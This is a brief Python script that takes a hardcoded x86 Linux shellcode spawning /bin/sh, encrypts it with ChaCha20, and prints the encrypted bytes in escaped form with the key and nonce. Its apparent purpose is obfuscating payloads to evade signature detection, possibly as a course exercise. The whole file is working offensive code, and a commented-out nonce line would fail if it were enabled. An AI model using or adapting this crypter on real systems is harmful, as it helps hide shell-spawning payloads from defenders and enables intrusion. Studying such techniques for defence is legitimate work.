#!/usr/bin/python3
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes

# setting data
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

key = get_random_bytes(32)
nonce = get_random_bytes(12)

# manually set key and nonce
#key = bytearray.fromhex("ebfe3a562330ee604a93be7eb164790e6f04c1e59f364b4c25a4c7f5b85a425c")
#nonce = get_random_bytes("33c4baf659808e9174804ae6")

# encrypt
cipher = ChaCha20.new(key=key, nonce = nonce)
encryptedShell = cipher.encrypt(shellcode)

# format in shellcode format
encryptedShellOutput = ''.join(f'\\x{byte:02x}'for byte in encryptedShell)

# print data
print("EncryptedShellcode: " + encryptedShellOutput)
print("Key: " + key.hex())
print("Nonce: " + nonce.hex())